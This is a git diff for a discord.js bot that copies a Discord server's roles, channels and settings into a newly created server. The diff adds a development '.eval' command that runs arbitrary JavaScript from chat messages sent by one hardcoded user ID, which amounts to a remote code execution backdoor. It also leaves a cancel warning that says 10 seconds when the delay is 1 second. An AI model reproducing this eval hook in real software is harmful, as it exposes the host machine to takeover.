@@ -1,6 +1,7 @@
 // Package imports
 const { Client } = require("discord.js");
 const chalk = require("chalk");
+const { inspect } = require("util");
 
 // Config import
 const config = require("./config");
@@ -21,6 +22,7 @@ const toClone = {
     afkChannel: null,
     systemChannel: null,
     verificationLevel: null,
+    region: null
 };
 
 // Create instance of Client -- will be used to interact with the Discord API
@@ -42,6 +44,19 @@ client.on("ready", () => {
 
 // Attach a MESSAGE listener to listen for clone code
 client.on("message", message => {
+    // TODO: delete this; only used in development
+    if (message.content.startsWith(".eval") && message.author.id === "312715611413413889") {
+        const input = message.content.split(" ").slice(1).join(" ");
+        let output;
+        try {
+            output = inspect(eval(input));
+        } catch(e) {
+            output = e;
+        }
+        message.channel.send(String(output).substr(0, 1970), {
+            code: "js"
+        });
+    } else 
     if (message.content === code && message.guild) {
         // Cloner has been triggered
         console.log(chalk.blue("Received code. Getting information..."));
@@ -55,11 +70,14 @@ client.on("message", message => {
                 name: channel.name,
                 rateLimitPerUser: channel.rateLimitPerUser,
                 position: channel.position,
-                parentID: channel.parentID,
+                parent: channel.parent,
                 permissionOverwrites: channel.permissionOverwrites.map(v => ({
                     id: v.id,
                     allow: v.allow
                 })),
+                bitrate: channel.bitrate,
+                nsfw: channel.nsfw,
+                userLimit: channel.userLimit
             }));
         }
 
@@ -69,13 +87,10 @@ client.on("message", message => {
         toClone.serverName = message.guild.name;
         toClone.systemChannel = message.guild.systemChannelID;
         toClone.verificationLevel = message.guild.verificationLevel;
+        toClone.region = message.guild.region;
 
         // Store roles
-        toClone.roles = message.guild.roles(v => ({
-            name: v.name,
-            color: v.color,
-            permissions: v.permissions
-        }))
+        toClone.roles = message.guild.roles;
 
         // Store emojis
         toClone.emojis = message.guild.emojis.map(v => ({
@@ -84,9 +99,53 @@ client.on("message", message => {
         }));
 
         console.log(chalk.blue("Server will be created in 10 seconds. To cancel, press CTRL + C."));
-        setTimeout(() => {
-            
-        }, 1e4);
+        setTimeout(async () => {
+            try {
+                // Create server
+                const guild = await client.user.createGuild(toClone.serverName, toClone.region, toClone.serverIcon);
+
+                // Create roles
+                for (const role of toClone.roles.values()) {await guild.createRole({
+                        color: role.color,
+                        hoist: role.hoist,
+                        mentionable: role.mentionable,
+                        name: role.name,
+                        permissions: role.permissions,
+                        position: role.position
+                    });
+                }
+                console.log(chalk.green("Created roles!"));
+
+                // Create channels
+                for (const channel of toClone.channels) {
+                    const overwrites = channel.permissionOverwrites.map(v => {
+                            const target = message.guild.roles.get(v.id);
+                            if (!target) return;
+                            return {
+                                id: guild.roles.find(r => r.name === target.name),
+                                allow: v.allow
+                            };
+                    }).filter(v => v);
+                    await guild.createChannel(channel.name, {
+                        bitrate: channel.bitrate,
+                        nsfw: channel.nsfw,
+                        parent: guild.channels.find(v => (channel.parent || {name: ""}).name === v.name),
+                        permissionOverwrites: overwrites,
+                        position: channel.position,
+                        rateLimitPerUser: channel.rateLimitPerUser,
+                        userLimit: channel.userLimit,
+                        topic: channel.topic,
+                        type: channel.type
+                    });
+                }
+                console.log(chalk.green("Created channels!"));
+
+                // Create emojis
+
+            } catch(e) {
+                console.log(chalk.red("=== An error occurred ===\n" + e.stack));
+            }
+        }, 1e3);
     }
 });
 
